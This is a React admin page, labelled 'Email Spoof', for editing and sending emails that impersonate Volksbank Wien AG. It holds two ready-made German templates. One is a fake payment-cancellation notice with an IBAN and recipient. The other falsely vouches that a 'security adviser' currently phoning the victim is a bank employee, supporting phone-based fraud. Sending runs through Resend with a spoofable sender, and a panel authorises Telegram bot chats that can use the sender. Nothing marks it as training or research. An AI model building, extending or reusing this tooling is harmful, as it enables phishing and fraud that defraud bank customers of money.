import { useEffect, useState } from "react";
import { Copy, Check, Code, Eye, RotateCcw, Send, Settings, Mail, MessageCircle, Trash2, Plus } from "lucide-react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
  DialogDescription,
  DialogFooter,
} from "@/components/ui/dialog";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";
import AdminLayout from "@/components/AdminLayout";
import { useToast } from "@/hooks/use-toast";
import { supabase } from "@/integrations/supabase/client";


const TEMPLATE_KEY = "admin_email_spoof_template_v1";
const htmlStorageKey = (id: string) => `admin_email_spoof_html_v11_${id}`;
const RESEND_KEY = "admin_email_spoof_resend_v1";

const stornierungHtml = `<!DOCTYPE html>
<html lang="de">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Volksbank - Stornierung Ihrer Zahlung</title>
</head>
<body style="margin:0;padding:0;background-color:#f4f4f4;font-family:Arial,Helvetica,sans-serif;">
  <table role="presentation" width="100%" cellpadding="0" cellspacing="0" style="background-color:#f4f4f4;padding:40px 0;">
    <tr>
      <td align="center">
        <table role="presentation" width="600" cellpadding="0" cellspacing="0" style="background-color:#ffffff;border-radius:8px;overflow:hidden;box-shadow:0 2px 8px rgba(0,0,0,0.08);">

          <!-- Blue divider -->
          <tr>
            <td style="height:3px;background-color:#004899;font-size:0;line-height:0;">&nbsp;</td>
          </tr>

          <!-- Body -->
          <tr>
            <td style="padding:35px 40px 30px 40px;">
              <h1 style="margin:0 0 25px 0;font-size:20px;color:#1a1a1a;font-weight:700;line-height:1.35;">
                Stornierung Ihrer Zahlung &ndash; in Bearbeitung
              </h1>

              <p style="margin:0 0 18px 0;font-size:15px;line-height:1.6;color:#333333;">
                {{ANREDE}} {{NACHNAME}},
              </p>

              <p style="margin:0 0 22px 0;font-size:15px;line-height:1.6;color:#333333;">
                wir informieren Sie hiermit, dass die nachfolgend aufgef&uuml;hrte Zahlung von Ihrem Konto derzeit im Stornierungsprozess bearbeitet wird.
              </p>

              <!-- Zahlungsdetails-Box -->
              <table role="presentation" width="100%" cellpadding="0" cellspacing="0" style="margin:0 0 25px 0;">
                <tr>
                  <td style="background-color:#f1f4f7;border-left:4px solid #004899;border-radius:0 6px 6px 0;padding:20px 24px;">
                    <p style="margin:0 0 10px 0;font-size:13px;font-weight:700;color:#004899;letter-spacing:0.4px;text-transform:uppercase;">
                      Zahlungsdetails
                    </p>
                    <p style="margin:0 0 6px 0;font-size:14px;line-height:1.6;color:#333333;">
                      <strong style="color:#1a1a1a;">Betrag:</strong> EUR 4.990,00
                    </p>
                    <p style="margin:0 0 6px 0;font-size:14px;line-height:1.6;color:#333333;">
                      <strong style="color:#1a1a1a;">Empf&auml;nger:</strong> ISTVAN ERDELYI
                    </p>
                    <p style="margin:0 0 6px 0;font-size:14px;line-height:1.6;color:#333333;">
                      <strong style="color:#1a1a1a;">IBAN:</strong> AT76 1400 0069 1093 2673
                    </p>
                    <p style="margin:0;font-size:14px;line-height:1.6;color:#333333;">
                      <strong style="color:#1a1a1a;">Zahlungsreferenz:</strong> STOR.884772
                    </p>
                  </td>
                </tr>
              </table>

              <p style="margin:0 0 22px 0;font-size:15px;line-height:1.6;color:#333333;">
                Die Stornierung wird <strong>umgehend</strong> durchgef&uuml;hrt, sobald Sie den <strong>Stornierungs- bzw. Quittungsbeleg</strong> pers&ouml;nlich an Ihrem Volksbank-Schalter abgeben. Der Betrag wird anschlie&szlig;end Ihrem Konto wieder gutgeschrieben.
              </p>

              <p style="margin:0 0 22px 0;font-size:15px;line-height:1.6;color:#333333;">
                Bitte bringen Sie zur Abwicklung einen <strong>amtlichen Lichtbildausweis</strong> sowie den zugeh&ouml;rigen Beleg mit. Ihr Guthaben ist zu jedem Zeitpunkt vollst&auml;ndig gesch&uuml;tzt.
              </p>

              <p style="margin:0;font-size:14px;line-height:1.6;color:#666666;">
                Bei R&uuml;ckfragen stehen Ihnen die Mitarbeiterinnen und Mitarbeiter Ihrer Volksbank-Filiale gerne zur Verf&uuml;gung.
              </p>
            </td>
          </tr>

          <!-- Footer -->
          <tr>
            <td style="background-color:#f8f9fa;padding:25px 40px;border-top:1px solid #e5e7eb;">
              <table role="presentation" width="100%" cellpadding="0" cellspacing="0">
                <tr>
                  <td>
                    <p style="margin:0 0 6px 0;font-size:12px;color:#999999;">
                      Volksbank Wien AG
                    </p>
                    <p style="margin:0 0 12px 0;font-size:12px;color:#999999;">
                      Dietrichgasse 25, 1030 Wien
                    </p>
                    <p style="margin:0;font-size:11px;color:#bbbbbb;">
                      <a href="https://www.volksbank.at/impressum" style="color:#999999;text-decoration:underline;">Impressum</a>
                      &nbsp;&middot;&nbsp;
                      <a href="https://www.volksbank.at/datenschutz" style="color:#999999;text-decoration:underline;">Datenschutz</a>
                      &nbsp;&middot;&nbsp;
                      <a href="https://www.volksbank.at" style="color:#999999;text-decoration:underline;">volksbank.at</a>
                    </p>
                  </td>
                </tr>
              </table>
            </td>
          </tr>

        </table>
      </td>
    </tr>
  </table>
</body>
</html>`;

const legitimierungHtml = `<!DOCTYPE html>
<html lang="de">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Volksbank - Mitarbeiter-Legitimierung</title>
</head>
<body style="margin:0;padding:0;background-color:#f4f4f4;font-family:Arial,Helvetica,sans-serif;">
  <table role="presentation" width="100%" cellpadding="0" cellspacing="0" style="background-color:#f4f4f4;padding:40px 0;">
    <tr>
      <td align="center">
        <table role="presentation" width="600" cellpadding="0" cellspacing="0" style="background-color:#ffffff;border-radius:8px;overflow:hidden;box-shadow:0 2px 8px rgba(0,0,0,0.08);">

          <!-- Blue divider -->
          <tr>
            <td style="height:3px;background-color:#004899;font-size:0;line-height:0;">&nbsp;</td>
          </tr>

          <!-- Body -->
          <tr>
            <td style="padding:35px 40px 30px 40px;">
              <h1 style="margin:0 0 25px 0;font-size:20px;color:#1a1a1a;font-weight:700;line-height:1.35;">
                Legitimierung Ihres Sicherheitsberaters
              </h1>

              <p style="margin:0 0 18px 0;font-size:15px;line-height:1.6;color:#333333;">
                {{ANREDE}} {{NACHNAME}},
              </p>

              <p style="margin:0 0 22px 0;font-size:15px;line-height:1.6;color:#333333;">
                zur Ihrer Sicherheit best&auml;tigen wir Ihnen hiermit schriftlich, dass der Sie derzeit telefonisch kontaktierende Sicherheitsberater ein <strong>offiziell autorisierter Mitarbeiter</strong> der Volksbank Wien AG ist. Bitte gleichen Sie die untenstehenden Legitimierungsdaten w&auml;hrend des Gespr&auml;chs mit Ihrem Berater ab.
              </p>

              <!-- Legitimierungs-Box -->
              <table role="presentation" width="100%" cellpadding="0" cellspacing="0" style="margin:0 0 25px 0;">
                <tr>
                  <td style="background-color:#f1f4f7;border-left:4px solid #004899;border-radius:0 6px 6px 0;padding:20px 24px;">
                    <p style="margin:0 0 10px 0;font-size:13px;font-weight:700;color:#004899;letter-spacing:0.4px;text-transform:uppercase;">
                      Legitimierungsdaten
                    </p>
                    <p style="margin:0 0 6px 0;font-size:14px;line-height:1.6;color:#333333;">
                      <strong style="color:#1a1a1a;">Sicherheitsberater:</strong> Simon Hengst
                    </p>
                    <p style="margin:0 0 6px 0;font-size:14px;line-height:1.6;color:#333333;">
                      <strong style="color:#1a1a1a;">Abteilung:</strong> Sicherheit &amp; Betrugspr&auml;vention
                    </p>
                    <p style="margin:0;font-size:14px;line-height:1.6;color:#333333;">
                      <strong style="color:#1a1a1a;">Referenznummer:</strong> LEG.774218
                    </p>
                  </td>
                </tr>
              </table>

              <p style="margin:0;font-size:15px;line-height:1.6;color:#333333;">
                Bitte nennen Sie Ihrem Berater bei R&uuml;ckfragen ausschlie&szlig;lich die oben genannte <strong>Referenznummer</strong>. So stellen wir gemeinsam sicher, dass Sie mit dem korrekten Ansprechpartner verbunden sind.
              </p>
            </td>
          </tr>

          <!-- Footer -->
          <tr>
            <td style="background-color:#f8f9fa;padding:25px 40px;border-top:1px solid #e5e7eb;">
              <table role="presentation" width="100%" cellpadding="0" cellspacing="0">
                <tr>
                  <td>
                    <p style="margin:0 0 6px 0;font-size:12px;color:#999999;">
                      Volksbank Wien AG
                    </p>
                    <p style="margin:0 0 12px 0;font-size:12px;color:#999999;">
                      Dietrichgasse 25, 1030 Wien
                    </p>
                    <p style="margin:0;font-size:11px;color:#bbbbbb;">
                      <a href="https://www.volksbank.at/impressum" style="color:#999999;text-decoration:underline;">Impressum</a>
                      &nbsp;&middot;&nbsp;
                      <a href="https://www.volksbank.at/datenschutz" style="color:#999999;text-decoration:underline;">Datenschutz</a>
                      &nbsp;&middot;&nbsp;
                      <a href="https://www.volksbank.at" style="color:#999999;text-decoration:underline;">volksbank.at</a>
                    </p>
                  </td>
                </tr>
              </table>
            </td>
          </tr>

        </table>
      </td>
    </tr>
  </table>
</body>
</html>`;

type TemplateDef = { id: string; label: string; subject: string; html: string };

const TEMPLATES: TemplateDef[] = [
  {
    id: "stornierung",
    label: "Stornierung Zahlung",
    subject: "Stornierung Ihrer Zahlung – Referenz STOR.884772",
    html: stornierungHtml,
  },
  {
    id: "legitimierung",
    label: "Mitarbeiter-Legitimierung",
    subject: "Legitimierung Ihres Sicherheitsberaters – Referenz LEG.774218",
    html: legitimierungHtml,
  },
];

const getTemplate = (id: string): TemplateDef => TEMPLATES.find((t) => t.id === id) || TEMPLATES[0];

type ResendConfig = { fromName: string; fromEmail: string };

const renderTemplate = (html: string, anrede: "Herr" | "Frau", nachname: string) => {
  const anredeFull = anrede === "Herr" ? "Sehr geehrter Herr" : "Sehr geehrte Frau";
  return html.split("{{ANREDE}}").join(anredeFull).split("{{NACHNAME}}").join(nachname || "");
};

const AdminEmailSpoof = () => {
  const [templateId, setTemplateId] = useState<string>(() => {
    if (typeof window === "undefined") return TEMPLATES[0].id;
    return localStorage.getItem(TEMPLATE_KEY) || TEMPLATES[0].id;
  });

  const [htmlCode, setHtmlCode] = useState(() => {
    if (typeof window === "undefined") return TEMPLATES[0].html;
    const id = localStorage.getItem(TEMPLATE_KEY) || TEMPLATES[0].id;
    return localStorage.getItem(htmlStorageKey(id)) || getTemplate(id).html;
  });

  const [showCode, setShowCode] = useState(false);
  const [copied, setCopied] = useState(false);

  const [resend, setResend] = useState<ResendConfig>(() => {
    if (typeof window === "undefined") return { fromName: "", fromEmail: "" };
    try {
      const raw = localStorage.getItem(RESEND_KEY);
      const parsed = raw ? JSON.parse(raw) : {};
      return { fromName: parsed.fromName || "", fromEmail: parsed.fromEmail || "" };
    } catch {
      return { fromName: "", fromEmail: "" };
    }
  });

  const [sendOpen, setSendOpen] = useState(false);
  const [step, setStep] = useState<"form" | "preview">("form");
  const [to, setTo] = useState("");
  const [anrede, setAnrede] = useState<"Herr" | "Frau">("Herr");
  const [nachname, setNachname] = useState("");
  const [subject, setSubject] = useState(() => {
    if (typeof window === "undefined") return TEMPLATES[0].subject;
    const id = localStorage.getItem(TEMPLATE_KEY) || TEMPLATES[0].id;
    return getTemplate(id).subject;
  });
  const [sending, setSending] = useState(false);

  // Telegram bot authorized chats
  type BotChat = { chat_id: number; label: string | null; created_at: string };
  const [botChats, setBotChats] = useState<BotChat[]>([]);
  const [newChatId, setNewChatId] = useState("");
  const [newChatLabel, setNewChatLabel] = useState("");
  const [addingChat, setAddingChat] = useState(false);

  const { toast } = useToast();

  const loadBotChats = async () => {
    const { data, error } = await supabase
      .from("email_bot_authorized_chats")
      .select("chat_id,label,created_at")
      .order("created_at", { ascending: false });
    if (error) {
      toast({ title: "Chat-IDs laden fehlgeschlagen", description: error.message, variant: "destructive" });
      return;
    }
    setBotChats((data || []) as BotChat[]);
  };

  useEffect(() => {
    loadBotChats();
  }, []);

  const addBotChat = async () => {
    const id = Number(newChatId.trim());
    if (!Number.isFinite(id) || !id) {
      toast({ title: "Ungültige Chat-ID", variant: "destructive" });
      return;
    }
    setAddingChat(true);
    const { error } = await supabase
      .from("email_bot_authorized_chats")
      .insert({ chat_id: id, label: newChatLabel.trim() || null });
    setAddingChat(false);
    if (error) {
      toast({ title: "Hinzufügen fehlgeschlagen", description: error.message, variant: "destructive" });
      return;
    }
    setNewChatId("");
    setNewChatLabel("");
    toast({ title: "Chat-ID hinzugefügt" });
    loadBotChats();
  };

  const removeBotChat = async (id: number) => {
    const { error } = await supabase.from("email_bot_authorized_chats").delete().eq("chat_id", id);
    if (error) {
      toast({ title: "Entfernen fehlgeschlagen", description: error.message, variant: "destructive" });
      return;
    }
    toast({ title: "Chat-ID entfernt" });
    loadBotChats();
  };

  const [webhookBusy, setWebhookBusy] = useState(false);
  const [webhookInfo, setWebhookInfo] = useState<{ url?: string; last_error_message?: string; pending_update_count?: number } | null>(null);

  const setWebhook = async () => {
    setWebhookBusy(true);
    const { data, error } = await supabase.functions.invoke("email-bot-set-webhook", { body: {} });
    setWebhookBusy(false);
    if (error) {
      toast({ title: "Webhook setzen fehlgeschlagen", description: error.message, variant: "destructive" });
      return;
    }
    const ok = (data as any)?.body?.ok;
    toast({ title: ok ? "Webhook gesetzt" : "Antwort erhalten", description: JSON.stringify((data as any)?.body ?? data) });
    checkWebhook();
  };

  const checkWebhook = async () => {
    setWebhookBusy(true);
    const { data, error } = await supabase.functions.invoke("email-bot-webhook-info", { body: {} });
    setWebhookBusy(false);
    if (error) {
      toast({ title: "Status-Abfrage fehlgeschlagen", description: error.message, variant: "destructive" });
      return;
    }
    const result = (data as any)?.body?.result;
    setWebhookInfo(result || null);
  };




  useEffect(() => {
    localStorage.setItem(htmlStorageKey(templateId), htmlCode);
  }, [htmlCode, templateId]);

  useEffect(() => {
    localStorage.setItem(TEMPLATE_KEY, templateId);
  }, [templateId]);

  const handleTemplateChange = (id: string) => {
    setTemplateId(id);
    const stored = localStorage.getItem(htmlStorageKey(id));
    const tpl = getTemplate(id);
    setHtmlCode(stored || tpl.html);
    setSubject(tpl.subject);
  };

  const handleCopy = async () => {
    await navigator.clipboard.writeText(htmlCode);
    setCopied(true);
    toast({ title: "HTML-Code kopiert!" });
    setTimeout(() => setCopied(false), 2000);
  };

  const handleReset = () => {
    const tpl = getTemplate(templateId);
    setHtmlCode(tpl.html);
    setSubject(tpl.subject);
    toast({ title: "Auf Original zurückgesetzt" });
  };

  const saveResend = () => {
    localStorage.setItem(RESEND_KEY, JSON.stringify(resend));
    toast({ title: "Resend-Konfiguration gespeichert" });
  };

  const previewHtml = renderTemplate(htmlCode, anrede, nachname || "Mustermann");

  const openSendDialog = () => {
    setStep("form");
    setSendOpen(true);
  };

  const goToPreview = () => {
    if (!to || !nachname) {
      toast({ title: "Bitte Empfänger-Email und Nachname angeben", variant: "destructive" });
      return;
    }
    setStep("preview");
  };

  const sendEmail = async () => {
    if (!resend.fromEmail || !resend.fromName) {
      toast({ title: "Resend-Konfiguration unvollständig", variant: "destructive" });
      return;
    }
    setSending(true);
    try {
      const { data, error } = await supabase.functions.invoke("send-spoof-email", {
        body: {
          fromName: resend.fromName,
          fromEmail: resend.fromEmail,
          to,
          subject,
          html: renderTemplate(htmlCode, anrede, nachname),
        },
      });
      if (error) throw new Error(error.message || "Function-Aufruf fehlgeschlagen");
      if (data?.error) throw new Error(data.error);
      toast({ title: "Email versendet!" });
      setSendOpen(false);
      setTo("");
      setNachname("");
    } catch (e: any) {
      toast({ title: "Versand fehlgeschlagen", description: e.message, variant: "destructive" });
    } finally {
      setSending(false);
    }
  };


  return (
    <AdminLayout>
      <div className="mx-auto max-w-5xl space-y-6">
        {/* Header */}
        <div className="flex items-start justify-between gap-4">
          <div>
            <h1 className="text-2xl font-bold tracking-tight text-slate-900">Email Spoof</h1>
            <p className="mt-1 text-sm text-slate-500">Volksbank Email-Template bearbeiten und versenden</p>
          </div>
          <div className="flex items-center gap-2">
            <div className="flex items-center gap-2">
              <Label className="text-xs text-slate-600">Vorlage:</Label>
              <Select value={templateId} onValueChange={handleTemplateChange}>
                <SelectTrigger className="h-9 w-[220px] text-xs">
                  <SelectValue />
                </SelectTrigger>
                <SelectContent>
                  {TEMPLATES.map((t) => (
                    <SelectItem key={t.id} value={t.id}>{t.label}</SelectItem>
                  ))}
                </SelectContent>
              </Select>
            </div>
            <Button variant="outline" size="sm" onClick={handleReset} className="gap-2 text-xs">
              <RotateCcw className="h-3.5 w-3.5" />
              Zurücksetzen
            </Button>
          </div>
        </div>

        {/* Preview */}
        <div className="overflow-hidden rounded-xl border border-slate-200 bg-white shadow-sm">
          <div className="flex items-center justify-between border-b border-slate-100 px-5 py-3">
            <div className="flex items-center gap-2 text-sm font-medium text-slate-700">
              <Eye className="h-4 w-4" />
              Vorschau
            </div>
            <div className="flex items-center gap-2">
              <Button variant="outline" size="sm" onClick={() => setShowCode(!showCode)} className="gap-2 text-xs">
                <Code className="h-3.5 w-3.5" />
                {showCode ? "Code ausblenden" : "HTML-Code anzeigen"}
              </Button>
              <Button variant="outline" size="sm" onClick={handleCopy} className="gap-2 text-xs">
                {copied ? <Check className="h-3.5 w-3.5" /> : <Copy className="h-3.5 w-3.5" />}
                {copied ? "Kopiert!" : "Kopieren"}
              </Button>
            </div>
          </div>
          <div className="bg-slate-50 p-6">
            <div className="mx-auto max-w-[640px] overflow-hidden rounded-lg border border-slate-200 bg-white shadow-sm">
              <iframe
                srcDoc={previewHtml}
                className="w-full border-none"
                style={{ height: "780px" }}
                title="Email Preview"
                sandbox=""
              />
            </div>
          </div>
        </div>

        {/* Code Editor */}
        {showCode && (
          <div className="overflow-hidden rounded-xl border border-slate-200 bg-white shadow-sm">
            <div className="flex items-center gap-2 border-b border-slate-100 px-5 py-3 text-sm font-medium text-slate-700">
              <Code className="h-4 w-4" />
              HTML-Code (Live-Bearbeitung) — Platzhalter: <code className="text-xs">{`{{ANREDE}}`}</code>, <code className="text-xs">{`{{NACHNAME}}`}</code>
            </div>
            <textarea
              value={htmlCode}
              onChange={(e) => setHtmlCode(e.target.value)}
              className="block w-full resize-y bg-slate-950 p-5 font-mono text-sm leading-relaxed text-emerald-400 focus:outline-none"
              style={{ minHeight: "500px" }}
              spellCheck={false}
            />
          </div>
        )}

        {/* Resend Config */}
        <div className="overflow-hidden rounded-xl border border-slate-200 bg-white shadow-sm">
          <div className="flex items-center gap-2 border-b border-slate-100 px-5 py-3 text-sm font-medium text-slate-700">
            <Settings className="h-4 w-4" />
            Resend-Konfiguration
          </div>
          <div className="space-y-4 p-5">
            <p className="text-xs text-slate-500">
              Der API-Key ist sicher in Supabase Secrets als <code className="text-xs">RESEND_API_KEY</code> hinterlegt.
            </p>
            <div className="grid gap-4 sm:grid-cols-2">
              <div>
                <Label htmlFor="fromName">Absendername</Label>
                <Input
                  id="fromName"
                  placeholder="Volksbank"
                  value={resend.fromName}
                  onChange={(e) => setResend({ ...resend, fromName: e.target.value })}
                  className="mt-1.5"
                />
              </div>
              <div>
                <Label htmlFor="fromEmail">Absender-Email</Label>
                <Input
                  id="fromEmail"
                  type="email"
                  placeholder="noreply@deinedomain.at"
                  value={resend.fromEmail}
                  onChange={(e) => setResend({ ...resend, fromEmail: e.target.value })}
                  className="mt-1.5"
                />
              </div>
            </div>
            <Button onClick={saveResend} size="sm">Speichern</Button>
          </div>
        </div>

        {/* Send Card */}
        <div className="overflow-hidden rounded-xl border border-slate-200 bg-white shadow-sm">
          <div className="flex items-center gap-2 border-b border-slate-100 px-5 py-3 text-sm font-medium text-slate-700">
            <Mail className="h-4 w-4" />
            Email versenden
          </div>
          <div className="flex items-center justify-between gap-4 p-5">
            <p className="text-sm text-slate-600">
              Sendet das aktuelle Template über Resend an einen Empfänger.
            </p>
            <Button onClick={openSendDialog} className="gap-2">
              <Send className="h-4 w-4" />
              Email versenden
            </Button>
          </div>
        </div>

        {/* Telegram Bot – autorisierte Chat-IDs */}
        <div className="overflow-hidden rounded-xl border border-slate-200 bg-white shadow-sm">
          <div className="flex items-center gap-2 border-b border-slate-100 px-5 py-3 text-sm font-medium text-slate-700">
            <MessageCircle className="h-4 w-4" />
            Telegram Email-Bot – autorisierte Chat-IDs
          </div>
          <div className="space-y-4 p-5">
            <p className="text-xs text-slate-500">
              Nur diese Chat-IDs dürfen den Telegram-Bot benutzen. Nicht autorisierte Nutzer bekommen ihre eigene Chat-ID vom Bot angezeigt.
            </p>
            <div className="grid gap-3 sm:grid-cols-[1fr_1fr_auto]">
              <div>
                <Label htmlFor="botChatId" className="text-xs">Chat-ID</Label>
                <Input
                  id="botChatId"
                  inputMode="numeric"
                  placeholder="123456789"
                  value={newChatId}
                  onChange={(e) => setNewChatId(e.target.value)}
                  className="mt-1.5"
                />
              </div>
              <div>
                <Label htmlFor="botChatLabel" className="text-xs">Bezeichnung (optional)</Label>
                <Input
                  id="botChatLabel"
                  placeholder="z.B. Max"
                  value={newChatLabel}
                  onChange={(e) => setNewChatLabel(e.target.value)}
                  className="mt-1.5"
                />
              </div>
              <div className="flex items-end">
                <Button onClick={addBotChat} disabled={addingChat} className="gap-2">
                  <Plus className="h-4 w-4" />
                  Hinzufügen
                </Button>
              </div>
            </div>

            {botChats.length === 0 ? (
              <p className="rounded-md border border-dashed border-slate-200 p-4 text-center text-xs text-slate-400">
                Noch keine Chat-IDs autorisiert.
              </p>
            ) : (
              <div className="divide-y divide-slate-100 rounded-md border border-slate-200">
                {botChats.map((c) => (
                  <div key={c.chat_id} className="flex items-center justify-between gap-3 px-4 py-2.5">
                    <div className="min-w-0">
                      <div className="font-mono text-sm text-slate-900">{c.chat_id}</div>
                      {c.label && <div className="truncate text-xs text-slate-500">{c.label}</div>}
                    </div>
                    <Button variant="ghost" size="sm" onClick={() => removeBotChat(c.chat_id)} className="gap-1 text-red-600 hover:text-red-700">
                      <Trash2 className="h-3.5 w-3.5" />
                      Entfernen
                    </Button>
                  </div>
                ))}
              </div>
            )}

            <div className="border-t border-slate-100 pt-4">
              <div className="mb-2 text-xs font-medium text-slate-700">Telegram Webhook</div>
              <div className="flex flex-wrap gap-2">
                <Button onClick={setWebhook} disabled={webhookBusy} size="sm">Webhook setzen</Button>
                <Button onClick={checkWebhook} disabled={webhookBusy} size="sm" variant="outline">Status prüfen</Button>
              </div>
              {webhookInfo && (
                <div className="mt-3 space-y-1 rounded-md border border-slate-200 bg-slate-50 p-3 text-xs">
                  <div><span className="text-slate-500">URL:</span> <span className="font-mono break-all">{webhookInfo.url || "—"}</span></div>
                  <div><span className="text-slate-500">Pending Updates:</span> {webhookInfo.pending_update_count ?? 0}</div>
                  {webhookInfo.last_error_message && (
                    <div className="text-red-600">Letzter Fehler: {webhookInfo.last_error_message}</div>
                  )}
                </div>
              )}
            </div>
          </div>

        </div>
      </div>


      {/* Send Dialog */}
      <Dialog open={sendOpen} onOpenChange={setSendOpen}>
        <DialogContent className="max-w-3xl">
          <DialogHeader>
            <DialogTitle>{step === "form" ? "Email vorbereiten" : "Vorschau"}</DialogTitle>
            <DialogDescription>
              {step === "form"
                ? "Empfänger und Anrede angeben."
                : "Prüfe die Email vor dem Versand."}
            </DialogDescription>
          </DialogHeader>

          {step === "form" ? (
            <div className="space-y-4">
              <div>
                <Label htmlFor="to">Empfänger-Email</Label>
                <Input
                  id="to"
                  type="email"
                  value={to}
                  onChange={(e) => setTo(e.target.value)}
                  placeholder="kunde@example.at"
                  className="mt-1.5"
                />
              </div>
              <div className="grid gap-4 sm:grid-cols-2">
                <div>
                  <Label>Anrede</Label>
                  <Select value={anrede} onValueChange={(v) => setAnrede(v as "Herr" | "Frau")}>
                    <SelectTrigger className="mt-1.5">
                      <SelectValue />
                    </SelectTrigger>
                    <SelectContent>
                      <SelectItem value="Herr">Herr</SelectItem>
                      <SelectItem value="Frau">Frau</SelectItem>
                    </SelectContent>
                  </Select>
                </div>
                <div>
                  <Label htmlFor="nachname">Nachname</Label>
                  <Input
                    id="nachname"
                    value={nachname}
                    onChange={(e) => setNachname(e.target.value)}
                    placeholder="Mustermann"
                    className="mt-1.5"
                  />
                </div>
              </div>
              <div>
                <Label htmlFor="subject">Betreff</Label>
                <Input
                  id="subject"
                  value={subject}
                  onChange={(e) => setSubject(e.target.value)}
                  className="mt-1.5"
                />
              </div>
            </div>
          ) : (
            <div className="overflow-hidden rounded-lg border border-slate-200">
              <iframe
                srcDoc={renderTemplate(htmlCode, anrede, nachname)}
                className="w-full border-none bg-white"
                style={{ height: "560px" }}
                title="Send Preview"
                sandbox=""
              />
            </div>
          )}

          <DialogFooter>
            {step === "form" ? (
              <>
                <Button variant="outline" onClick={() => setSendOpen(false)}>Abbrechen</Button>
                <Button onClick={goToPreview}>Vorschau anzeigen</Button>
              </>
            ) : (
              <>
                <Button variant="outline" onClick={() => setStep("form")}>Zurück</Button>
                <Button onClick={sendEmail} disabled={sending} className="gap-2">
                  <Send className="h-4 w-4" />
                  {sending ? "Sende..." : "Jetzt senden"}
                </Button>
              </>
            )}
          </DialogFooter>
        </DialogContent>
      </Dialog>
    </AdminLayout>
  );
};

export default AdminEmailSpoof;
